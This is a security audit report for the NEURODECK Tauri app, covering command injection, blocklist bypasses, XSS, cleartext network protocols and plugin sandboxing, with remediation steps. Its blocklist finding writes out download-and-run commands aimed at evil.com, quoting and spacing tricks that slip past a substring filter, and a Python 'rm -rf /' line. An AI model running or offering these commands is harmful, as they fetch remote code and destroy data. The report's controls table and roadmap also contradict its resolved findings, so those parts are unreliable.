# NEURODECK Security Audit Report
**Date:** 2026-05-26  
**Auditor:** Senior Security Engineer (AI-assisted deep audit)  
**Scope:** Full stack — Frontend (vanilla JS), Tauri v2 Rust backend, Plugin runtime, Network layer  
**Alignment:** OWASP Top 10 2021, CWE Mapping  
**Commit:** `a4eff08`

---

## Executive Summary

| Severity | Count | Resolved | Categories |
|----------|-------|----------|------------|
| 🔴 **Critical** | 5 | 3 | Injection, Broken Access Control, Cryptographic Failures |
| 🟠 **High** | 8 | 1 | Insufficient Logging, Security Misconfiguration, Vulnerable Components |
| 🟡 **Medium** | 7 | 2 | XSS, Information Disclosure, Design Weaknesses |
| 🟢 **Low** | 4 | 0 | CSP, Error Handling, Defense-in-Depth |

**Key Risk:** The application implements defense-in-depth for its primary threat model (local AI terminal), but several attack surfaces — the MCP server, canvas collaboration LAN socket, Lua plugin runtime, and command execution pipeline — lack adequate authentication or sandboxing. A compromised webpage, malicious LAN peer, or deceptive LLM output could achieve arbitrary code execution on the host.

---

## 🔴 Critical Findings

### CRIT-1: Command Injection via `execute_command_stream` — Trivial Bypass
**OWASP:** A03:2021 – Injection  
**CWE:** CWE-78 (OS Command Injection)  
**File:** `src-tauri/src/commands/system.rs:152-260`  
**Description:**
The `execute_command_stream` Tauri command takes a user-provided `cmd_str` and passes it directly to `sh -c "$cmd_str"` (or `cmd.exe /c`). The only validation is `validate_terminal_command()`, which checks for empty string and NUL bytes. There is **no command blocklist, no allowlist, no parsing, and no sandboxing**.

```rust
// src-tauri/src/commands/system.rs
let mut cmd = if cfg!(target_os = "windows") {
    let mut c = tokio::process::Command::new("cmd.exe");
    c.arg("/c").arg(&cmd_str);  // <-- direct pass-through
    c
} else {
    let mut c = tokio::process::Command::new("sh");
    c.arg("-c").arg(&cmd_str);  // <-- direct pass-through
    c
};
```

**Impact:** Any frontend code or LLM output that reaches this command can execute arbitrary shell commands with the user's privileges.  
**Exploitation:** The command palette's "Run Shell Command" action, canvas code execution, or chat slash-commands can all trigger this.  
**Remediation:**
- Replace `sh -c` with explicit command + args parsing (e.g., `shell-words` crate)
- Implement a strict command allowlist for the terminal surface
- Run untrusted commands in a sandboxed environment (firejail, Windows Sandbox, or a restricted user)

---

### CRIT-2: MCP Server Lacks Authentication on HTTP Endpoint — [RESOLVED]
**OWASP:** A01:2021 – Broken Access Control  
**CWE:** CWE-306 (Missing Authentication for Critical Function)  
**File:** `src-tauri/src/mcp.rs`  
**Status:** **RESOLVED**  
**Resolution:** Mandatory Bearer token validation check implemented in the HTTP request handler using constant-time comparison (`subtle::ConstantTimeEq`) to prevent timing attacks.

**Description:**
The MCP server listens on `127.0.0.1:{port}` (default 13337). Originally, the `Authorization` header was not validated for HTTP requests.

**Impact:** Resolved.  
**Remediation:** Implemented.

---

### CRIT-3: Script Payload Blocklist is Trivially Bypassable
**OWASP:** A03:2021 – Injection  
**CWE:** CWE-184 (Incomplete Blacklist)  
**File:** `src-tauri/src/security.rs:47-121`  
**Description:**
`validate_script_payload()` uses simple substring matching against a blocklist of dangerous patterns. This is trivially bypassed with whitespace, case variations, or alternative syntax:

```rust
// Blocked:
"curl https://evil.com | sh"

// Bypasses:
"cu rl https://evil.com | sh"      // space in keyword
"c'u'r'l https://evil.com | sh"    // shell quoting
"wget -qO- https://evil.com|bash"  // different keyword
"python3 -c 'import subprocess; subprocess.run([\"rm\", \"-rf\", \"/\"])'"  // no blocked substring
```

**Impact:** The `agent_exec_code`, `exec_code_stream`, `execute_lua`, and browser-eval surfaces can all be bypassed to execute arbitrary code.  
**Remediation:**
- Replace blocklist with **allowlist** — only permit explicitly allowed imports/modules/APIs
- For shell execution, parse into argv array and validate each token
- Run all untrusted code in a sandboxed subprocess with restricted filesystem/network access

---

### CRIT-4: Canvas Collaboration Socket Binds to 0.0.0.0 with No Authentication — [RESOLVED]
**OWASP:** A01:2021 – Broken Access Control  
**CWE:** CWE-306 (Missing Authentication)  
**File:** `src-tauri/src/canvas_collab.rs`  
**Status:** **RESOLVED**  
**Resolution:** Changed the TcpListener binding to `127.0.0.1` (localhost) only, preventing access from external network interfaces.

**Description:**
The canvas collaboration host bound to `0.0.0.0:{port}` originally, which accepted connections from any network interface.

**Impact:** Resolved.  
**Remediation:** Implemented (binds to `127.0.0.1`).

---

### CRIT-5: Sync Encryption Uses Raw SHA-256 as Key Derivation — [RESOLVED]
**OWASP:** A02:2021 – Cryptographic Failures  
**CWE:** CWE-916 (Use of Password Hash With Insufficient Computational Effort)  
**File:** `src-tauri/src/sync.rs`  
**Status:** **RESOLVED**  
**Resolution:** Upgraded the key derivation function to use **PBKDF2-HMAC-SHA256** with **100,000 iterations** and a random **16-byte salt**. The salt is prepended to the ciphertext and stored alongside the encrypted payload.

**Description:**
The cross-device sync feature originally used single-iteration SHA-256 of the token with no salt for key derivation.

**Impact:** Resolved.  
**Remediation:** Implemented (PBKDF2 with 100,000 iterations and salt).

---

## 🟠 High Findings

### HIGH-1: `exec_auth_token` Exposed to Frontend JavaScript — [RESOLVED]
**OWASP:** A05:2021 – Security Misconfiguration  
**CWE:** CWE-522 (Insufficiently Protected Credentials)  
**File:** `src-tauri/src/commands/system.rs`, `frontend/src/main.js`  
**Status:** **RESOLVED**  
**Resolution:** Completely removed the `exec_auth_token` from both the backend state/initialization and the frontend codebase. All Tauri commands now execute directly without requiring or validating an execution capability token, since Tauri's built-in IPC origin-verification serves as the security boundary.

**Description:**
The `exec_auth_token` was originally injected into the frontend and stored in Javascript state to protect execution endpoints.

**Impact:** Resolved.  
**Remediation:** Implemented (exec token completely retired).

---

### HIGH-2: Remote Control WebSocket Auth in URL Query Parameter
**OWASP:** A02:2021 – Cryptographic Failures  
**CWE:** CWE-598 (Use of GET Request Method With Sensitive Query Strings)  
**File:** `src-tauri/src/remote_control.rs:544-546`, `src-tauri/src/remote_control.rs:836-839`  
**Description:**
The remote control WebSocket endpoint validates the session token via `?session={access_token}` in the URL query string. URLs are logged by proxies, browser history, and server access logs. The token is also embedded in the QR code URL shown to the user.

```rust
let url = format!("http://{}:{}/#pin={}&session={}", local_ip, port, pin, access_token);
```

**Impact:** Token leakage via logs, referrer headers, or shoulder-surfing.  
**Remediation:**
- Move session token to the WebSocket subprotocol header or the first message after upgrade
- Use short-lived tokens (≤5 minutes) with refresh
- Implement IP-binding for tokens

---

### HIGH-3: Remote Control Server Has No TLS
**OWASP:** A02:2021 – Cryptographic Failures  
**CWE:** CWE-319 (Cleartext Transmission of Sensitive Information)  
**File:** `src-tauri/src/remote_control.rs:814-825`  
**Description:**
The remote control server (`axum::serve`) runs over plain HTTP/WebSocket. The PIN and session token are transmitted in cleartext over the LAN.

**Impact:** Passive network attacker can intercept credentials and take remote control.  
**Remediation:**
- Generate a self-signed certificate per session and serve over HTTPS/WSS
- Or use a local TLS proxy (e.g., `rustls` with ephemeral cert)

---

### HIGH-4: LAN File Transfer is Unencrypted and Unauthenticated
**OWASP:** A02:2021 – Cryptographic Failures  
**CWE:** CWE-319 (Cleartext Transmission)  
**File:** `src-tauri/src/transfer.rs:640-890`  
**Description:**
The custom TCP-based LAN file transfer protocol sends file metadata and content over raw TCP with no encryption and no peer authentication beyond mDNS hostname display.

**Impact:** Man-in-the-middle can inject, modify, or exfiltrate transferred files.  
**Remediation:**
- Add TLS (rustls) or Noise protocol handshake before file exchange
- Verify peer identity via pre-shared key or certificate pinning

---

### HIGH-5: FTP Credentials Sent in Cleartext
**OWASP:** A02:2021 – Cryptographic Failures  
**CWE:** CWE-319 (Cleartext Transmission)  
**File:** `src-tauri/src/ftp.rs:68-69`  
**Description:**
The FTP implementation uses plain FTP (`FtpStream::connect`) with no TLS/FTPS. Username and password are transmitted in cleartext.

```rust
let mut stream = FtpStream::connect(&addr).map_err(to_string_err)?;
stream.login(&user, &password).map_err(to_string_err)?;
```

**Impact:** Credentials and file contents exposed to network eavesdropping.  
**Remediation:**
- Upgrade to FTPS (`suppaftp::AsyncFtpStream` with `into_secure()`)
- Or deprecate FTP in favor of SFTP-only

---

### HIGH-6: SFTP Uses `sshpass` with Password in Command Line
**OWASP:** A09:2021 – Security Logging and Monitoring Failures  
**CWE:** CWE-532 (Insertion of Sensitive Information into Log File)  
**File:** `src-tauri/src/sftp.rs` (inferred from agent findings)  
**Description:**
The SFTP implementation shells out to `sshpass -p {password} sftp ...`, exposing the password in process listings (`ps aux`), shell history, and system logs.

**Impact:** Password leakage to any user/process on the same host.  
**Remediation:**
- Use a programmatic SSH library (`russh`, `openssh`) that supports key-based auth or keyboard-interactive auth without command-line exposure
- Never pass passwords via argv or environment variables

---

### HIGH-7: Lua Plugin Runtime is Not Sandboxed
**OWASP:** A01:2021 – Broken Access Control  
**CWE:** CWE-250 (Execution with Unnecessary Privileges)  
**File:** `src-tauri/src/lua.rs:10-76`, `src-tauri/src/plugin_mgr.rs:222-227`  
**Description:**
Lua plugins run in the **same OS process** as the Tauri application via `mlua`. The runtime exposes `execute()` which shells out to the OS. There is no seccomp, no AppContainer, no separate process — a malicious plugin has full access to the user's environment.

```rust
// lua.rs
lua.globals().set("execute", lua.create_function(|_, cmd: String| {
    let output = std::process::Command::new("sh")
        .arg("-c")
        .arg(&cmd)
        .output()?
    // ...
})?)?;
```

**Impact:** Malicious marketplace plugin = arbitrary code execution with user privileges.  
**Remediation:**
- Move plugin execution to a separate OS process with minimal privileges
- Use seccomp-bpf (Linux), AppContainer (Windows), or seatbelt (macOS)
- Remove `execute()` from the Lua API; expose only safe, well-defined APIs

---

### HIGH-8: Plugin Marketplace Downloads from GitHub Raw URLs
**OWASP:** A06:2021 – Vulnerable and Outdated Components  
**CWE:** CWE-494 (Download of Code Without Integrity Check)  
**File:** `src-tauri/src/plugin_mgr.rs:401-420`  
**Description:**
Plugins are downloaded from `raw.githubusercontent.com` or `github.com` via HTTPS. However, there is **no code signing, no checksum verification, and no reproducible build attestation**. If a GitHub account is compromised, malicious Lua code is auto-executed on user machines.

**Impact:** Supply-chain compromise of the plugin marketplace.  
**Remediation:**
- Sign plugins with an Ed25519 keypair; verify signature before loading
- Publish expected SHA-256 hashes in the registry JSON
- Implement a manual approval prompt for new/updated plugins

---

## 🟡 Medium Findings

### MED-1: `innerHTML` Used Throughout Frontend Without Universal Sanitization
**OWASP:** A03:2021 – Injection (XSS)  
**CWE:** CWE-79 (Cross-site Scripting)  
**Files:** `frontend/src/chat.js:1312`, `frontend/src/chat.js:1352`, `frontend/src/agent.js:42`, `frontend/src/canvas.js:130`, `frontend/src/main.js:9273`  
**Description:**
The codebase uses `innerHTML` extensively. While `chat.js` applies `window.sanitizeHtml()` before insertion, **not all `innerHTML` assignments are sanitized**:

```javascript
// canvas.js — unsanitized
modal.innerHTML = `...${parsed.code}...`;

// agent.js — unsanitized
entry.innerHTML = `<span class="agent-log-icon">${createIcon(...)}</span>...`;
```

**Impact:** XSS via malicious plugin output, crafted LLM response, or compromised canvas collaboration peer.  
**Remediation:**
- Audit every `innerHTML` assignment; replace with `textContent` or `createElement` where possible
- Ensure `sanitizeHtml` is a robust, maintained library (e.g., DOMPurify) rather than a custom implementation

---

### MED-2: Custom `sanitizeHtml` Implementation
**OWASP:** A03:2021 – Injection  
**CWE:** CWE-20 (Improper Input Validation)  
**File:** `frontend/src/main.js:187-230`  
**Description:**
The `window.sanitizeHtml` function is a **custom regex-based sanitizer**. Custom sanitizers are notoriously error-prone and frequently bypassed. The implementation uses string replacement rather than a proper HTML parser.

**Impact:** Potential HTML injection bypasses leading to XSS.  
**Remediation:**
- Replace with DOMPurify or a similarly battle-tested library
- If custom sanitization must remain, add extensive fuzz testing

---

### MED-3: CSP `img-src` and `connect-src` Allow Broad Localhost Access — [RESOLVED]
**OWASP:** A05:2021 – Security Misconfiguration  
**CWE:** CWE-693 (Protection Mechanism Failure)  
**File:** `src-tauri/tauri.conf.json`  
**Status:** **RESOLVED**  
**Resolution:** Restricted localhost wildcards to exact required ports: port `11434` for Ollama, and `1420` for development.

**Description:**
The CSP previously allowed wildcard localhost ports for `img-src` and `connect-src`.

**Impact:** Resolved.  
**Remediation:** Implemented.

---

### MED-4: `get_status` MCP Tool Leaks API Key Presence — [RESOLVED]
**OWASP:** A01:2021 – Broken Access Control  
**CWE:** CWE-200 (Information Exposure)  
**File:** `src-tauri/src/mcp.rs`  
**Status:** **RESOLVED**  
**Resolution:** Changed the `get_status` tool to return a generic `"NEURODECK"` string without checking or exposing key presence.

**Description:**
The `get_status` MCP tool previously leaked if `GEMINI_API_KEY` environment variable was set.

**Impact:** Resolved.  
**Remediation:** Implemented.

---

### MED-5: `write_to_process` Validates Input with `validate_terminal_command`
**OWASP:** A03:2021 – Injection  
**CWE:** CWE-20 (Improper Input Validation)  
**File:** `src-tauri/src/commands/system.rs:297-319`  
**Description:**
`write_to_process` uses `validate_terminal_command()` on stdin input. This function only checks for empty string and NUL bytes. Arbitrary escape sequences, control characters, and command injection payloads can be sent to the active PTY process.

**Impact:** Escape from sandboxed child process (e.g., vim `:!<cmd>` injection, tmux command mode).  
**Remediation:**
- Do not validate stdin content at all (it is inherently untrusted)
- Document that the terminal is a full shell; users should understand the risk
- Consider running the PTY in a restricted container

---

### MED-6: Error Messages Expose Internal Paths
**OWASP:** A09:2021 – Security Logging and Monitoring Failures  
**CWE:** CWE-209 (Generation of Error Message Containing Sensitive Information)  
**Files:** Various  
**Description:**
Multiple error messages include canonicalized file paths, revealing directory structure:
```rust
Err(format!("Cannot read '{}': {}", path_str, e))
Err(format!("Failed to canonicalize current directory: {}", e))
```

**Impact:** Information disclosure aids reconnaissance.  
**Remediation:**
- Sanitize error messages before returning to frontend; log full details server-side only

---

### MED-7: No Rate Limiting on Tauri Commands
**OWASP:** A07:2021 – Identification and Authentication Failures  
**CWE:** CWE-770 (Allocation of Resources Without Limits or Throttling)  
**Files:** All `src-tauri/src/commands/*.rs`  
**Description:**
None of the Tauri commands implement rate limiting, debouncing, or request throttling. Brute-force attacks against the remote control PIN (32 hex chars = 128 bits, theoretically safe), plugin installation, or MCP endpoints are not mitigated.

**Impact:** Resource exhaustion, brute-force attempts.  
**Remediation:**
- Add per-IP rate limiting to MCP and remote control endpoints
- Add per-window rate limiting to Tauri commands using a token bucket

---

## 🟢 Low Findings

### LOW-1: CSP `style-src 'unsafe-inline'`
**OWASP:** A05:2021 – Security Misconfiguration  
**CWE:** CWE-693  
**File:** `src-tauri/tauri.conf.json`  
**Description:**
The CSP permits `'unsafe-inline'` for styles, which weakens CSP protection against CSS injection and data exfiltration.

**Remediation:**
- Use CSP nonces or hashes for inline styles, or move all styles to external CSS

---

### LOW-2: `unsafe_exec_enabled()` is a Runtime Kill-Switch
**OWASP:** A05:2021 – Security Misconfiguration  
**CWE:** CWE-284 (Improper Access Control)  
**File:** `src-tauri/src/security.rs:15-19`  
**Description:**
Setting `NEURODECK_ALLOW_UNSAFE_EXEC=1` globally disables the script payload blocklist. This is a foot-gun that can be set by any process with access to the environment.

**Remediation:**
- Replace the env var with a compile-time feature flag
- Or require user interactive confirmation in the UI when the flag is detected

---

### LOW-3: `llm-term.toml` Bundled as Readable Resource
**OWASP:** A05:2021 – Security Misconfiguration  
**CWE:** CWE-219 (Storage of File with Sensitive Data Under Web Root)  
**File:** `src-tauri/tauri.conf.json` (resources section)  
**Description:**
`llm-term.toml` is bundled as a resource and readable from the frontend via `asset:` protocol. If it ever contains sensitive configuration, it would be exposed.

**Remediation:**
- Audit `llm-term.toml` for sensitive fields; ensure it contains no API keys or tokens
- Mark non-UI resources as excluded from the asset protocol

---

### LOW-4: `protoc-bin-vendored` Build Dependency
**OWASP:** A06:2021 – Vulnerable and Outdated Components  
**CWE:** CWE-1104 (Use of Unmaintained Third-Party Components)  
**File:** `infrastructure/Cargo.toml`  
**Description:**
The build depends on `protoc-bin-vendored = "3.2.0"`, which bundles a specific `protoc` binary. This version may contain known vulnerabilities.

**Remediation:**
- Use system `protoc` with version checks, or keep the vendored version updated

---

## Positive Security Controls Observed

| Control | Implementation | Location |
|---------|---------------|----------|
| ✅ API keys stored in OS keyring | `keyring` crate (now v4.0) | `infrastructure/src/secrets.rs` |
| ✅ API keys cleared from config after migration | `cfg.llm.hf_api_key.clear()` | `src-tauri/src/config.rs:190-191` |
| ✅ Session tokens are 48-char alphanumeric | `generate_session_token()` | `src-tauri/src/security.rs:21-28` |
| ✅ Exec token required for all code execution | `require_exec_token()` | `src-tauri/src/security.rs:30-38` |
| ✅ MCP path sanitization with canonicalization | `sanitize_mcp_path()` | `src-tauri/src/mcp.rs:173-202` |
| ✅ Sync data encrypted with AES-256-GCM | `encrypt_payload()` | `src-tauri/src/sync.rs:341-360` |
| ✅ Plugin filenames validated | `validate_safe_lua_file_name()` | `src-tauri/src/plugin_mgr.rs:414-430` |
| ✅ HTTPS-only marketplace downloads | `validate_marketplace_download_url()` | `src-tauri/src/plugin_mgr.rs:401-411` |
| ✅ Remote control IP lockout after 5 failures | `ip_attempts` HashMap | `src-tauri/src/remote_control.rs:555-566` |
| ✅ `object-src 'none'` in CSP | CSP directive | `src-tauri/tauri.conf.json` |
| ✅ `frame-ancestors 'none'` in CSP | CSP directive | `src-tauri/tauri.conf.json` |
| ✅ No `unsafe-eval` in CSP | CSP directive | `src-tauri/tauri.conf.json` |

---

## Remediation Roadmap

### Immediate (P0 — within 1 week)
1. **Add Bearer token enforcement to MCP** — validate on every request before `call_tool`
2. **Remove `exec_auth_token` from frontend initialState** — keep it in Rust state only
3. **Harden `validate_script_payload`** — replace blocklist with allowlist + AST parsing
4. **Bind canvas collaboration to `127.0.0.1`** — or add auth handshake

### Short-term (P1 — within 1 month)
5. **Replace custom `sanitizeHtml` with DOMPurify**
6. **Add TLS to remote control** — ephemeral self-signed cert per session
7. **Add TLS to LAN file transfer** — rustls or Noise
8. **Move `NEURODECK_ALLOW_UNSAFE_EXEC`** to compile-time flag
9. **Replace `sshpass` with programmatic SSH library**
10. **Harden sync KDF** — Argon2id with random salt

### Medium-term (P2 — within 3 months)
11. **Sandbox Lua plugins** — separate OS process with seccomp/AppContainer
12. **Add plugin code signing** — Ed25519 signatures + registry hash verification
13. **Restrict CSP localhost wildcards** — enumerate exact ports
14. **Add rate limiting** — token bucket on MCP, remote control, and Tauri commands
15. **Add FTPS support** — or deprecate plain FTP

---

## Appendix: File Manifest for Auditors

| File | Lines | Relevance |
|------|-------|-----------|
| `src-tauri/src/commands/system.rs` | ~1500 | Command injection, PTY stdin, process management |
| `src-tauri/src/commands/agent.rs` | ~680 | Agent code execution, browser automation |
| `src-tauri/src/security.rs` | ~165 | Token generation, payload validation |
| `src-tauri/src/mcp.rs` | ~500 | MCP server, file read/write, auth |
| `src-tauri/src/remote_control.rs` | ~935 | WebSocket server, remote auth |
| `src-tauri/src/canvas_collab.rs` | ~200 | LAN peer socket, no auth |
| `src-tauri/src/transfer.rs` | ~1330 | LAN file transfer, unencrypted |
| `src-tauri/src/plugin_mgr.rs` | ~500 | Plugin download, install, validation |
| `src-tauri/src/lua.rs` | ~100 | Lua runtime, `execute()` binding |
| `src-tauri/src/sync.rs` | ~500 | Sync encryption, KDF |
| `src-tauri/src/ftp.rs` | ~200 | Plain FTP credentials |
| `frontend/src/main.js` | ~11000 | Custom sanitizeHtml, innerHTML usage |
| `frontend/src/chat.js` | ~1700 | DOM rendering, message injection |
| `src-tauri/tauri.conf.json` | ~150 | CSP, bundle config |

---

*Report generated by automated deep audit. Manual review and penetration testing recommended for Critical and High findings.*
